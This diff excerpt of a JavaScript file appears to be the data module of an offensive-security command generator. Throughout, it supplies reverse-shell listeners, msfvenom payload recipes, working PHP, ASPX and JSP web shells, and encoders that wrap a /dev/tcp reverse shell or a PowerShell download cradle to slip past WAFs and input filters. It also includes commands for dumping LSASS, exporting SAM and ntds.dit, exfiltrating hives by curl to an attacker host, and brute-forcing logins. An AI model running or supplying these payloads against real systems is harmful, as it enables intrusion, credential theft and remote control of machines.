+      id: 'win-rlwrap', label: '3. Windows rlwrap Listener & Arrow-Key History', title: 'Windows rlwrap Listener & Arrow-Key History', os: 'windows',
+      note: 'Wrap your Kali netcat listener with rlwrap BEFORE catching a Windows shell to get up-arrow command history and line editing.',
+      steps: [
+        { locus: 'kali$', note: '1. Start listener wrapped in rlwrap', label: '1. Start listener wrapped in rlwrap', cmd: 'rlwrap -cAr nc -lvnp {{lport}}' },
+      ]
+    },
+    {
+      id: 'win-conpty', label: '4. Windows Full Interactive ConPTY Upgrade', title: 'Windows Full Interactive ConPTY Upgrade', os: 'windows',
+      note: 'Gives a true interactive Windows console with tab-completion and arrow keys.',
+      steps: [
+        { locus: 'kali$', note: '1. Start raw ConPTY listener on Kali', label: '1. Start raw ConPTY listener on Kali', cmd: 'stty raw -echo; (stty size; cat) | nc -lvnp {{lport}}' },
+        { locus: 'PS C:\\>', note: '2. Invoke ConPtyShell on Windows Target', label: '2. Invoke ConPtyShell on Windows Target', cmd: 'IEX(IWR http://{{lhost}}:8000/Invoke-ConPtyShell.ps1 -UseBasicParsing); Invoke-ConPtyShell {{lhost}} {{lport}}' },
+      ]
+    },
+  ];
+
+  W.MSFVENOM_RECIPES = [
+    { id: 'linux-elf-x64', label: 'Linux x64 ELF Binary', os: 'linux', ext: 'rev.elf', payload: 'linux/x64/shell_reverse_tcp', fmt: 'elf',
+      note: 'Stageless Linux binary. Catch with standard nc -lvnp {{lport}}.',
+      runTpl: 'chmod +x /dev/shm/rev.elf && /dev/shm/rev.elf' },
+    { id: 'win-exe-x64', label: 'Windows x64 EXE Binary', os: 'windows', ext: 'rev.exe', payload: 'windows/x64/shell_reverse_tcp', fmt: 'exe',
+      note: 'Stageless Windows executable. Catch with rlwrap nc -lvnp {{lport}}.',
+      runTpl: 'C:\\Windows\\Temp\\rev.exe' },
+    { id: 'win-service-exe', label: 'Windows Service EXE (exe-service)', os: 'windows', ext: 'svc.exe', payload: 'windows/x64/shell_reverse_tcp', fmt: 'exe-service',
+      note: 'Required when replacing a Windows service binary or abusing an unquoted service path (standard EXEs get killed by the Service Control Manager after 30 seconds).',
+      runTpl: 'sc.exe stop VulnService && sc.exe start VulnService' },
+    { id: 'win-dll-x64', label: 'Windows x64 DLL (Hijack / DnsAdmins)', os: 'windows', ext: 'hijack.dll', payload: 'windows/x64/shell_reverse_tcp', fmt: 'dll',
+      note: 'For DLL hijacking or DnsAdmins ServerLevelPluginDll abuse.',
+      runTpl: 'rundll32.exe C:\\Windows\\Temp\\hijack.dll,StartW' },
+    { id: 'win-msi', label: 'Windows MSI Package (AlwaysInstallElevated)', os: 'windows', ext: 'setup.msi', payload: 'windows/x64/shell_reverse_tcp', fmt: 'msi',
+      note: 'For AlwaysInstallElevated (0x1) privilege escalation to SYSTEM.',
+      runTpl: 'msiexec /quiet /qn /i C:\\Windows\\Temp\\setup.msi' },
+    { id: 'web-aspx', label: 'IIS ASPX Reverse Shell', os: 'windows', ext: 'shell.aspx', payload: 'windows/x64/shell_reverse_tcp', fmt: 'aspx',
+      note: 'Upload to an IIS web root and trigger via curl.',
+      runTpl: 'curl -fsSL http://{{target}}/shell.aspx' },
+    { id: 'web-war', label: 'Tomcat WAR Archive', os: 'linux', ext: 'shell.war', payload: 'java/jsp_shell_reverse_tcp', fmt: 'war',
+      note: 'Deploy via Tomcat /manager/html or /manager/text and request /shell/.',
+      runTpl: 'curl -fsSL http://{{target}}:8080/shell/' },
+  ];
+
+  W.buildMsfvenom = function (recipeId, lhostOrVals, lportArg) {
+    var lhost = '{{lhost}}', lport = '{{lport}}', target = '{{target}}';
+    if (lhostOrVals && typeof lhostOrVals === 'object') {
+      lhost = lhostOrVals.lhost || '{{lhost}}';
+      lport = lhostOrVals.lport || '{{lport}}';
+      target = lhostOrVals.target || '{{target}}';
+    } else {
+      if (lhostOrVals) lhost = String(lhostOrVals);
+      if (lportArg) lport = String(lportArg);
+    }
+    var r = W.MSFVENOM_RECIPES.filter(function (x) { return x.id === recipeId; })[0] || W.MSFVENOM_RECIPES[0];
+    var gen = 'msfvenom -p ' + r.payload + ' LHOST=' + lhost + ' LPORT=' + lport + ' -f ' + r.fmt + ' -o ' + r.ext;
+    var listener = (r.os === 'windows' ? 'rlwrap -cAr ' : '') + 'nc -lvnp ' + lport;
+    var runCmd = String(r.runTpl || '').replace(/\{\{lhost\}\}/g, lhost).replace(/\{\{lport\}\}/g, lport).replace(/\{\{target\}\}/g, target);
+    var note = String(r.note || '').replace(/\{\{lhost\}\}/g, lhost).replace(/\{\{lport\}\}/g, lport);
+    return {
+      id: r.id, label: r.label, note: note,
+      generate: gen, listener: listener, run: runCmd,
+      recipe: r, genCmd: gen, listenerCmd: listener, runCmd: runCmd
+    };
+  };
+
+  W.WEBSHELLS = [
+    { id: 'php-tiny', label: 'PHP Tiny GET Shell', os: 'linux', file: 'cmd.php', ext: '.php',
+      code: '<?php system($_GET["c"]); ?>', payload: '<?php system($_GET["c"]); ?>',
+      trigger: 'curl -G "http://{{target}}/cmd.php" --data-urlencode "c=id;hostname"',
+      usage: 'curl -G "http://{{target}}/cmd.php" --data-urlencode "c=id;hostname"',
+      note: 'Smallest 29-byte PHP webshell. Pass commands via the ?c= parameter.' },
+    { id: 'php-fallback', label: 'PHP Multi-Function Fallback', os: 'linux', file: 'shell.php', ext: '.php',
+      code: '<?php $c=$_REQUEST["c"]; if(function_exists("system")){system($c);}elseif(function_exists("passthru")){passthru($c);}elseif(function_exists("shell_exec")){echo shell_exec($c);} ?>',
+      payload: '<?php $c=$_REQUEST["c"]; if(function_exists("system")){system($c);}elseif(function_exists("passthru")){passthru($c);}elseif(function_exists("shell_exec")){echo shell_exec($c);} ?>',
+      trigger: 'curl -G "http://{{target}}/shell.php" --data-urlencode "c=id"',
+      usage: 'curl -G "http://{{target}}/shell.php" --data-urlencode "c=id"',
+      note: 'Survives disable_functions restrictions when only one execution primitive is blocked.' },
+    { id: 'aspx-cmd', label: 'IIS ASPX Command Webshell', os: 'windows', file: 'cmd.aspx', ext: '.aspx',
+      code: '<%@ Page Language="C#" %><%@ Import Namespace="System.Diagnostics" %><% string c=Request["c"]; if(c!=null){Process p=new Process();p.StartInfo.FileName="cmd.exe";p.StartInfo.Arguments="/c "+c;p.StartInfo.UseShellExecute=false;p.StartInfo.RedirectStandardOutput=true;p.Start();Response.Write(p.StandardOutput.ReadToEnd());} %>',
+      payload: '<%@ Page Language="C#" %><%@ Import Namespace="System.Diagnostics" %><% string c=Request["c"]; if(c!=null){Process p=new Process();p.StartInfo.FileName="cmd.exe";p.StartInfo.Arguments="/c "+c;p.StartInfo.UseShellExecute=false;p.StartInfo.RedirectStandardOutput=true;p.Start();Response.Write(p.StandardOutput.ReadToEnd());} %>',
+      trigger: 'curl -G "http://{{target}}/cmd.aspx" --data-urlencode "c=whoami /all"',
+      usage: 'curl -G "http://{{target}}/cmd.aspx" --data-urlencode "c=whoami /all"',
+      note: 'Compact C# ASPX webshell for IIS servers.' },
+    { id: 'jsp-cmd', label: 'Java / Tomcat JSP Webshell', os: 'linux', file: 'cmd.jsp', ext: '.jsp',
+      code: '<% if(request.getParameter("c")!=null){Process p=Runtime.getRuntime().exec(new String[]{"/bin/sh","-c",request.getParameter("c")});java.util.Scanner s=new java.util.Scanner(p.getInputStream()).useDelimiter("\\\\A");out.print(s.hasNext()?s.next():"");} %>',
+      payload: '<% if(request.getParameter("c")!=null){Process p=Runtime.getRuntime().exec(new String[]{"/bin/sh","-c",request.getParameter("c")});java.util.Scanner s=new java.util.Scanner(p.getInputStream()).useDelimiter("\\\\A");out.print(s.hasNext()?s.next():"");} %>',
+      trigger: 'curl -G "http://{{target}}:8080/cmd.jsp" --data-urlencode "c=id"',
+      usage: 'curl -G "http://{{target}}:8080/cmd.jsp" --data-urlencode "c=id"',
+      note: 'Executes commands through /bin/sh -c on Tomcat, Jetty, or JBoss.' },
+  ];
+
+  // ── WAF, Filter Evasion & Time-Saving Scenario Recipes ──────────────────────────────────────
+  W.CODEC_SCENARIOS = [
+    {
+      id: 'linux-rce',
+      color: 'cyan',
+      badge: 'Linux Shell Wrapper',
+      title: '1. Linux Command Breaking on Bad Chars (|, &, >, Quotes)',
+      when: 'Use when your Linux command or reverse shell works locally, but fails inside a web parameter, curl request, cron job, or RCE field because pipes, redirects, or quotes get mangled.',
+      sample: 'bash -i >& /dev/tcp/10.10.14.2/4444 0>&1'
+    },
+    {
+      id: 'win-psenc',
+      color: 'amber',
+      badge: 'Windows PowerShell',
+      title: '2. Windows PowerShell -EncodedCommand (UTF-16LE)',
+      when: 'Use when running PowerShell from cmd.exe, a web shell, xp_cmdshell, or a scheduled task where quotes, $, or & break execution.',
+      sample: 'IEX(New-Object Net.WebClient).DownloadString("http://10.10.14.2:8000/shell.ps1")'
+    },
+    {
+      id: 'space-slash',
+      color: 'emerald',
+      badge: 'Command Injection Bypass',
+      title: '3. Command Injection: Spaces or Slashes (/) Blocked',
+      when: 'Use when a web form (such as a ping/diagnostic input) lets you inject ; or |, but strips spaces or rejects / path characters.',
+      sample: 'cat /etc/passwd'
+    },
+    {
+      id: 'quote-free',
+      color: 'violet',
+      badge: 'SQLi & XSS Filter Bypass',
+      title: '4. SQLi or XSS: Single & Double Quotes Blocked',
+      when: 'Use when a WAF or magic_quotes blocks \' and ", preventing you from writing string literals like \'admin\' or \'/var/www/html/cmd.php\'.',
+      sample: '/var/www/html/cmd.php'
+    }
+  ];
+
+  W.buildCodecScenario = function (scenarioId, text, params) {
+    var s = String(text == null ? '' : text);
+    var scen = W.CODEC_SCENARIOS.filter(function (x) { return x.id === scenarioId; })[0] || W.CODEC_SCENARIOS[0];
+    var bytes = utf8Bytes(s);
+    var hex = W.hexEnc(s);
+    var decCodes = bytes.join(',');
+    var b64 = W.b64(s);
+    var psb64 = W.psEnc(s);
+    var braceParts = s.trim().split(/\s+/).filter(Boolean);
+    var braceOut = braceParts.length > 1 ? ('{' + braceParts.map(function (pt) { return pt.replace(/,/g, '\\,'); }).join(',') + '}') : s;
+    var items = [];
+
+    if (scen.id === 'win-psenc') {
+      var fullPs = 'powershell.exe -nop -w hidden -enc ' + psb64;
+      items = [
+        { id: 'ps-full', label: 'Ready-to-Run PowerShell -EncodedCommand', locus: 'C:\\>', note: 'Drop directly into cmd.exe, a webshell, or xp_cmdshell. Zero quotes or special characters.', out: fullPs },
+        { id: 'ps-b64only', label: 'Raw UTF-16LE Base64 Blob Only', locus: 'encoded', note: 'Just the UTF-16LE Base64 string if your template already has powershell -enc.', out: psb64 },
+        { id: 'ps-url', label: 'URL-Encoded PowerShell One-Liner (for GET/POST RCE)', locus: 'url', note: 'Paste directly into a URL query parameter (?cmd=...) in Burp or curl.', out: W.urlEnc(fullPs) },
+      ];
+    } else if (scen.id === 'space-slash') {
+      var slashBypass = s.replace(/\//g, '${PATH:0:1}');
+      var bothBypass = W.ifsEvade(s).replace(/\//g, '${PATH:0:1}');
+      items = [
+        { id: 'ifs', label: 'Bash ${IFS} Space Bypass', locus: 'target$', note: 'Replaces every space with ${IFS} (Internal Field Separator) in bash/sh.', out: W.ifsEvade(s) },
+        { id: 'brace', label: 'Bash {cmd,arg} Brace Expansion (Zero Spaces)', locus: 'target$', note: 'Executes a command and its arguments in bash without any space characters.', out: braceOut },
+        { id: 'slash', label: 'Linux ${PATH:0:1} Slash (/) Bypass', locus: 'target$', note: 'Since $PATH begins with /usr..., ${PATH:0:1} evaluates to / without typing a slash.', out: slashBypass },
+        { id: 'both', label: 'Combined Space (${IFS}) + Slash (${PATH:0:1}) Bypass', locus: 'target$', note: 'Evades filters that block both spaces and forward slashes simultaneously.', out: bothBypass },
+      ];
+    } else if (scen.id === 'quote-free') {
+      var pgChr = bytes.length ? bytes.map(function (b) { return 'CHR(' + b + ')'; }).join('||') : '';
+      items = [
+        { id: 'sqlhex', label: 'MySQL / MSSQL Hex Literal (0x...)', locus: 'sql>', note: 'Drop 0x... directly wherever a quoted string would go in MySQL or MSSQL.', out: hex ? ('0x' + hex) : '' },
+        { id: 'sqlchar', label: 'SQL CHAR(...) Expression (MSSQL / MySQL / SQLite)', locus: 'sql>', note: 'Builds the string from ASCII codes with zero quotes.', out: bytes.length ? ('CHAR(' + decCodes + ')') : '' },
+        { id: 'pgchr', label: 'PostgreSQL / Oracle CHR(...) Concatenation', locus: 'sql>', note: 'Builds a quote-free string in PostgreSQL or Oracle.', out: pgChr },
+        { id: 'jschar', label: 'JavaScript String.fromCharCode(...) (Quote-Free XSS)', locus: 'js>', note: 'Constructs a JS string without single quotes, double quotes, or slashes.', out: bytes.length ? ('String.fromCharCode(' + decCodes + ')') : '' },
+      ];
+    } else {
+      var stdRunner = W.linuxB64Runner(s, 'bash');
+      var ifsRunner = 'echo${IFS}' + b64 + '|base64${IFS}-d|bash';
+      items = [
+        { id: 'b64bash', label: 'Standard Linux Base64 Pipe Runner', locus: 'target$', note: 'Wraps your command in Base64 so pipes, redirects (>&), and quotes cannot break.', out: stdRunner },
+        { id: 'b64ifs', label: 'Spaceless Base64 Runner (No Spaces + No Bad Chars)', locus: 'target$', note: 'Use when the RCE field also breaks on spaces as well as special characters.', out: ifsRunner },
+        { id: 'b64url', label: 'URL-Encoded Base64 Runner (Ready for GET/POST Parameter)', locus: 'url', note: 'Paste directly into a URL query string (?cmd=...) in Burp Repeater or curl.', out: W.urlEnc(stdRunner) },
+      ];
+    }
+    return { scenario: scen, items: items };
+  };
+
+  W.evasionTransforms = function (text) {
+    var s = String(text == null ? '' : text);
+    var bytes = utf8Bytes(s);
+    var hex = W.hexEnc(s);
+    var decCodes = bytes.join(',');
+    var braceParts = s.trim().split(/\s+/).filter(Boolean);
+    var braceOut = braceParts.length > 1 ? ('{' + braceParts.map(function (p) { return p.replace(/,/g, '\\,'); }).join(',') + '}') : s;
+    return [
+      { id: 'ifs', label: 'Bash ${IFS} Space Bypass', note: 'Replaces spaces with ${IFS} when a command-injection filter strips spaces.', out: W.ifsEvade(s) },
+      { id: 'brace', label: 'Bash Brace Expansion', note: 'Executes a command with arguments without using any spaces.', out: braceOut },
+      { id: 'b64bash', label: 'Linux Base64 Pipe Runner', note: 'Eliminates quotes, pipes, and redirects so the payload survives web/CLI filters.', out: W.linuxB64Runner(s, 'bash') },
+      { id: 'psenc', label: 'PowerShell -EncodedCommand', note: 'UTF-16LE Base64 one-liner for Windows command execution without quoting issues.', out: 'powershell -nop -w hidden -enc ' + W.psEnc(s) },
+      { id: 'sqlhex', label: 'SQL Hex Literal (0x...)', note: 'Replaces quoted strings in MySQL/MSSQL queries when single and double quotes are blocked.', out: hex ? ('0x' + hex) : '' },
+      { id: 'sqlchar', label: 'SQL CHAR(...) Expression', note: 'Builds a string without quotes in SQL Server / MySQL / SQLite.', out: bytes.length ? ('CHAR(' + decCodes + ')') : '' },
+      { id: 'jschar', label: 'JS String.fromCharCode(...)', note: 'Builds a JavaScript string without quotes or slashes for XSS filters.', out: bytes.length ? ('String.fromCharCode(' + decCodes + ')') : '' },
+    ];
+  };
+
+  // ── *2john File Hash Extractors & Crack Pipeline ────────────────────────────────────────────
+  W.JOHN_EXTRACTORS = [
+    { id: 'ssh2john', tool: 'ssh2john', file: 'id_rsa', label: 'SSH Private Key (id_rsa)', cmd: 'ssh2john id_rsa > id_rsa.hash', extractCmd: 'ssh2john id_rsa > id_rsa.hash', mode: 22911, john: 'SSH', note: 'Extracts the passphrase hash from an encrypted PEM/OpenSSH private key.' },
+    { id: 'zip2john', tool: 'zip2john', file: 'backup.zip', label: 'ZIP Archive (.zip)', cmd: 'zip2john backup.zip > zip.hash', extractCmd: 'zip2john backup.zip > zip.hash', mode: 17200, john: 'PKZIP', note: 'Extracts PKZIP / WinZip AES hash from password-protected ZIP files.' },
+    { id: 'rar2john', tool: 'rar2john', file: 'secret.rar', label: 'RAR Archive (.rar)', cmd: 'rar2john secret.rar > rar.hash', extractCmd: 'rar2john secret.rar > rar.hash', mode: 13000, john: 'rar5', note: 'Extracts RAR3 (-m 12500) or RAR5 (-m 13000) archive password hashes.' },
+    { id: 'keepass2john', tool: 'keepass2john', file: 'Database.kdbx', label: 'KeePass Vault (.kdbx)', cmd: 'keepass2john Database.kdbx > kdbx.hash', extractCmd: 'keepass2john Database.kdbx > kdbx.hash', mode: 13400, john: 'KeePass', note: 'Extracts the master password hash from a KeePass .kdbx database.' },
+    { id: 'office2john', tool: 'office2john', file: 'payroll.xlsx', label: 'MS Office Doc (.docx/.xlsx)', cmd: 'office2john payroll.xlsx > office.hash', extractCmd: 'office2john payroll.xlsx > office.hash', mode: 9600, john: 'office', note: 'Extracts Office 2007/2010/2013+ encryption hashes.' },
+    { id: 'pfx2john', tool: 'pfx2john', file: 'cert.pfx', label: 'PKCS#12 Certificate (.pfx/.p12)', cmd: 'pfx2john cert.pfx > pfx.hash', extractCmd: 'pfx2john cert.pfx > pfx.hash', mode: 24410, john: 'pfx', note: 'Extracts the import password hash from an ADCS or TLS .pfx bundle.' },
+    { id: '7z2john', tool: '7z2john', file: 'archive.7z', label: '7-Zip Archive (.7z)', cmd: '7z2john archive.7z > 7z.hash', extractCmd: '7z2john archive.7z > 7z.hash', mode: 11600, john: '7z', note: 'Extracts 7-Zip archive password hash (requires perl 7z2john.pl on Kali).' },
+    { id: 'pdf2john', tool: 'pdf2john', file: 'confidential.pdf', label: 'Encrypted PDF (.pdf)', cmd: 'pdf2john confidential.pdf > pdf.hash', extractCmd: 'pdf2john confidential.pdf > pdf.hash', mode: 10500, john: 'PDF', note: 'Extracts owner/user password hash from a protected PDF.' },
+  ];
+
+  W.crackPipelineCmds = function (candOrMode, johnOrClean, cleanOrOpts, userArg) {
+    var mode = null, john = null, cleanedHash = '', hf = 'hash.txt', wl = '/usr/share/wordlists/rockyou.txt', user = '';
+    if (candOrMode && typeof candOrMode === 'object') {
+      mode = candOrMode.mode;
+      john = candOrMode.john;
+      cleanedHash = johnOrClean || '';
+      var opts = cleanOrOpts || {};
+      hf = opts.hashfile || hf;
+      wl = opts.wordlist || wl;
+      user = opts.username || '';
+    } else {
+      mode = candOrMode;
+      john = johnOrClean;
+      cleanedHash = cleanOrOpts || '';
+      user = userArg || '';
+    }
+    var cmds = [];
+    var safeHash = String(cleanedHash || '').replace(/'/g, "'\\''");
+    if (mode != null) {
+      cmds.push({ label: 'Standard Dictionary Crack (Hashcat)', locus: 'kali$', cmd: W.hashcatCmd(mode, hf, wl) });
+      cmds.push({ label: 'Rule-Boosted Crack (best64.rule)', locus: 'kali$', cmd: 'hashcat -m ' + mode + ' ' + hf + ' ' + wl + ' -r /usr/share/hashcat/rules/best64.rule' });
+      if (safeHash && safeHash.length < 320) {
+        cmds.push({ label: 'One-Liner Save + Crack + Show', locus: 'kali$', cmd: "echo '" + safeHash + "' > " + hf + ' && hashcat -m ' + mode + ' ' + hf + ' ' + wl + ' && hashcat -m ' + mode + ' ' + hf + ' --show' });
+      }
+      if (user) {
+        cmds.push({ label: 'Crack Pasted user:hash File Directly (--username)', locus: 'kali$', cmd: 'hashcat --username -m ' + mode + ' ' + hf + ' ' + wl });
+      }
+    }
+    if (john) {
+      cmds.push({ label: 'John the Ripper Dictionary Crack', locus: 'kali$', cmd: W.johnCmd(john, hf, wl) });
+      cmds.push({ label: 'Show Cracked Passwords (John)', locus: 'kali$', cmd: 'john --format=' + john + ' --show ' + hf });
+    }
+    return cmds;
+  };
+
+  // ── Windows LOLBAS (Living Off The Land Binaries & Scripts) ─────────────────────────────────
+  var _LOLBAS_LIST = [
+    { key: 'certutil', bin: 'certutil.exe', url: 'https://lolbas-project.github.io/lolbas/Binaries/Certutil/', fns: {
+      'Download': [{ description: 'Download payload over HTTP without PowerShell.', code: 'certutil.exe -urlcache -split -f http://{{lhost}}:8000/nc64.exe C:\\Windows\\Temp\\nc64.exe' }],
+      'Encode / Decode': [
+        { description: 'Base64-encode a local file for copy-paste exfiltration.', code: 'certutil.exe -encode C:\\Windows\\Repair\\SAM C:\\Windows\\Temp\\sam.b64' },
+        { description: 'Decode a base64 payload staged on target.', code: 'certutil.exe -decode C:\\Windows\\Temp\\payload.b64 C:\\Windows\\Temp\\payload.exe' }
+      ]
+    }},
+    { key: 'powershell', bin: 'powershell.exe', url: 'https://lolbas-project.github.io/lolbas/', fns: {
+      'Download': [
+        { description: 'Download a file to disk with Invoke-WebRequest.', code: 'powershell -nop -c "iwr -Uri http://{{lhost}}:8000/winPEASx64.exe -OutFile C:\\Windows\\Temp\\winPEASx64.exe -UseBasicParsing"' },
+        { description: 'Fileless in-memory execution via WebClient DownloadString.', code: 'powershell -nop -w hidden -c "IEX(New-Object Net.WebClient).DownloadString(\'http://{{lhost}}:8000/shell.ps1\')"' }
+      ],
+      'Privilege Escalation': [
+        { description: 'Read PowerShell command history across all users.', code: 'type C:\\Users\\*\\AppData\\Roaming\\Microsoft\\Windows\\PowerShell\\PSReadLine\\ConsoleHost_history.txt' }
+      ]
+    }},
+    { key: 'rundll32', bin: 'rundll32.exe', url: 'https://lolbas-project.github.io/lolbas/Binaries/Rundll32/', fns: {
+      'Execute': [{ description: 'Execute an exported function from a staged DLL.', code: 'rundll32.exe C:\\Windows\\Temp\\hijack.dll,StartW' }],
+      'Credentials': [{ description: 'Dump LSASS memory without procdump using comsvcs.dll (requires SeDebugPrivilege / Admin).', code: 'rundll32.exe C:\\Windows\\System32\\comsvcs.dll, MiniDump <LSASS_PID> C:\\Windows\\Temp\\lsass.dmp full' }]
+    }},
+    { key: 'regsvr32', bin: 'regsvr32.exe', url: 'https://lolbas-project.github.io/lolbas/Binaries/Regsvr32/', fns: {
+      'Execute': [{ description: 'Silently register/execute a staged DLL.', code: 'regsvr32.exe /s /n /u /i:http://{{lhost}}:8000/payload.sct scrobj.dll' }]
+    }},
+    { key: 'msiexec', bin: 'msiexec.exe', url: 'https://lolbas-project.github.io/lolbas/Binaries/Msiexec/', fns: {
+      'Privilege Escalation': [
+        { description: 'Install a malicious MSI silently (escalates to SYSTEM when AlwaysInstallElevated is 0x1).', code: 'msiexec.exe /quiet /qn /i C:\\Windows\\Temp\\setup.msi' },
+        { description: 'Execute an MSI directly from a remote HTTP server.', code: 'msiexec.exe /q /i http://{{lhost}}:8000/setup.msi' }
+      ]
+    }},
+    { key: 'cmdkey', bin: 'cmdkey.exe', url: 'https://lolbas-project.github.io/lolbas/', fns: {
+      'Credentials': [{ description: 'List cached Windows Vault credentials (pair with runas /savecred).', code: 'cmdkey /list' }]
+    }},
+    { key: 'runas', bin: 'runas.exe', url: 'https://lolbas-project.github.io/lolbas/', fns: {
+      'Privilege Escalation': [{ description: 'Execute a reverse shell as Administrator using cached credentials shown in cmdkey /list.', code: 'runas /savecred /user:Administrator "C:\\Windows\\Temp\\nc64.exe {{lhost}} {{lport}} -e cmd.exe"' }]
+    }},
+    { key: 'vssadmin', bin: 'vssadmin.exe', url: 'https://lolbas-project.github.io/lolbas/', fns: {
+      'Credentials': [{ description: 'Create a Volume Shadow Copy to read locked ntds.dit or SAM/SYSTEM hives.', code: 'vssadmin create shadow /for=C: && copy \\\\?\\GLOBALROOT\\Device\\HarddiskVolumeShadowCopy1\\Windows\\NTDS\\ntds.dit C:\\Windows\\Temp\\ntds.dit' }]
+    }},
+    { key: 'reg', bin: 'reg.exe', url: 'https://lolbas-project.github.io/lolbas/Binaries/Reg/', fns: {
+      'Credentials': [{ description: 'Export SAM, SYSTEM, and SECURITY hives for offline secretsdump extraction.', code: 'reg save HKLM\\SAM C:\\Windows\\Temp\\sam.save && reg save HKLM\\SYSTEM C:\\Windows\\Temp\\system.save' }]
+    }},
+    { key: 'robocopy', bin: 'robocopy.exe', url: 'https://lolbas-project.github.io/lolbas/', fns: {
+      'File Copy': [{ description: 'Copy protected files in Backup Mode (/B) when holding SeBackupPrivilege.', code: 'robocopy /B C:\\Users\\Administrator\\Desktop C:\\Windows\\Temp root.txt' }]
+    }},
+    { key: 'icacls', bin: 'icacls.exe', url: 'https://lolbas-project.github.io/lolbas/', fns: {
+      'Privilege Escalation': [{ description: 'Grant full control on a service binary or config after taking ownership.', code: 'icacls "C:\\Program Files\\VulnSvc\\svc.exe" /grant Everyone:F' }]
+    }},
+    { key: 'curl', bin: 'curl.exe', url: 'https://lolbas-project.github.io/lolbas/Binaries/Curl/', fns: {
+      'Download': [{ description: 'Built into Windows 10 (1803+) and Server 2019+: fast HTTP file download.', code: 'curl.exe -s http://{{lhost}}:8000/nc64.exe -o C:\\Windows\\Temp\\nc64.exe' }],
+      'Upload': [{ description: 'Exfiltrate a file back to a Kali HTTP listener.', code: 'curl.exe -X POST http://{{lhost}}:8000/upload -F "files=@C:\\Windows\\Temp\\sam.save"' }]
+    }}
+  ];
+  _LOLBAS_LIST.forEach(function (item) { _LOLBAS_LIST[item.key] = item; });
+  W.LOLBAS = _LOLBAS_LIST;
+
+  // ── Wordlist Fuzzing Tool Switcher & Custom Generators ──────────────────────────────────────
+  W.fuzzCmd = function (toolOrOpts, taskArg, targetArg, pathArg, extArg) {
+    var opts = (toolOrOpts && typeof toolOrOpts === 'object') ? toolOrOpts : {
+      tool: toolOrOpts, task: taskArg, target: targetArg, path: pathArg, ext: extArg
+    };
+    var task = opts.task || 'dirs';
+    var tool = opts.tool || (task === 'dirs' ? 'gobuster' : 'ffuf');
+    var path = opts.path || '/usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt';
+    var tgt = opts.target || '<target>';
+    var dom = opts.domain || 'acme.internal';
+    var usr = opts.user || 'bob';
+    var ext = opts.ext ? String(opts.ext).replace(/^\./, '') : '';
+    var dotExt = ext ? ('.' + ext.split(',').map(function (e) { return e.trim().replace(/^\./, ''); }).join(',.')) : '';
+    if (task === 'users') {
+      if (tool === 'kerbrute') return 'kerbrute userenum -d ' + dom + ' --dc ' + tgt + ' ' + path;
+      if (tool === 'hydra') return "hydra -L " + path + " -p 'Autumn2026!' ssh://" + tgt;
+      if (tool === 'ffuf') return 'ffuf -u http://' + tgt + '/login -X POST -H "Content-Type: application/x-www-form-urlencoded" -d "username=FUZZ&password=Password123!" -w ' + path + ' -fs 0';
+      return "nxc smb " + tgt + " -u " + path + " -p '' --continue-on-success";
+    }
+    if (task === 'passwords') {
+      if (tool === 'hashcat') return 'hashcat -m 1000 hashes.txt ' + path + ' -r /usr/share/hashcat/rules/best64.rule -O';
+      if (tool === 'john') return 'john --wordlist=' + path + ' --rules hashes.txt';
+      if (tool === 'hydra') return 'hydra -l ' + usr + ' -P ' + path + ' ssh://' + tgt;
+      if (tool === 'ffuf') return 'ffuf -u http://' + tgt + '/login -X POST -H "Content-Type: application/x-www-form-urlencoded" -d "username=' + usr + '&password=FUZZ" -w ' + path + ' -fc 200';
+      return 'nxc smb ' + tgt + ' -u ' + usr + ' -p ' + path + ' --continue-on-success';
+    }
+    if (task === 'lfi') {
+      if (tool === 'wfuzz') return 'wfuzz -c -z file,' + path + ' --hc 404 "http://' + tgt + '/index.php?page=FUZZ"';
+      if (tool === 'feroxbuster') return 'feroxbuster -u "http://' + tgt + '/index.php?page=FUZZ" -w ' + path + ' --no-state -t 40';
+      return W.wordlistCmd(task, path, tgt, ext);
+    }
+    if (task === 'params') {
+      if (tool === 'arjun') return 'arjun -u http://' + tgt + '/index.php -w ' + path;
+      if (tool === 'wfuzz') return 'wfuzz -c -z file,' + path + ' -- hc 404,400 "http://' + tgt + '/index.php?FUZZ=test"'.replace('-- hc', '--hc');
+      return W.wordlistCmd(task, path, tgt, ext);
+    }
+    if (task === 'subdomains') {
+      if (tool === 'gobuster') return 'gobuster vhost -u http://' + tgt + '/ -w ' + path + ' --append-domain -t 40';
+      if (tool === 'wfuzz') return 'wfuzz -c -w ' + path + ' -H "Host: FUZZ.' + tgt + '" --hc 400,404 http://' + tgt + '/';
+      return 'ffuf -u http://' + tgt + '/ -H "Host: FUZZ.' + tgt + '" -w ' + path + ' -fs 0';
+    }
+    if (tool === 'ffuf') {
+      return 'ffuf -u http://' + tgt + '/FUZZ -w ' + path + (dotExt ? (' -e ' + dotExt) : '') + ' -mc 200,204,301,302,307,401,403 -t 40';
+    }
+    if (tool === 'feroxbuster') {
+      return 'feroxbuster -u http://' + tgt + '/ -w ' + path + (ext ? (' -x ' + ext) : '') + ' --no-state -t 40';
+    }
+    if (tool === 'dirsearch') {
+      return 'dirsearch -u http://' + tgt + '/ -w ' + path + (ext ? (' -e ' + ext) : '');
+    }
+    return W.wordlistCmd(task, path, tgt, ext);
+  };
+
+  W.CUSTOM_WORDLIST_CMDS = [
+    { label: 'CeWL: Spider Target Website for Custom Password Wordlist', note: 'Scrapes unique words from the target web app.', locus: 'kali$', cmd: 'cewl -d 2 -m 5 http://{{target}}/ -w custom-words.txt' },
+    { label: 'Hashcat Rules: Mutate Custom Words with best64.rule', note: 'Turns a small company word list into a high-hit password candidate list.', locus: 'kali$', cmd: 'hashcat --stdout custom-words.txt -r /usr/share/hashcat/rules/best64.rule > mutated-passwords.txt' },
+    { label: 'Username-Anarchy: Generate AD Username Permutations (j.doe, jdoe)', note: 'Builds candidate AD usernames from employee full names.', locus: 'kali$', cmd: 'username-anarchy -i names.txt > users.txt' },
+  ];
+
+  // ── Manual SQLi Extra Modes (Auth Bypass, Error/Blind, File Read & RCE) ─────────────────────
+  W.sqliExtraPayloads = function (modeOrState, dbmsArg, lhostArg) {
+    var mode = (typeof modeOrState === 'string') ? modeOrState : null;
+    var state = (modeOrState && typeof modeOrState === 'object') ? modeOrState : { dbms: dbmsArg, lhost: lhostArg };
+    var dbms = state.dbms || dbmsArg || 'mysql';
+    var lhost = state.lhost || lhostArg || '{{lhost}}';
+    var d = SQLI_DBMS[dbms] || SQLI_DBMS.mysql;
+    var c = d.comment;
+    var bypass = [
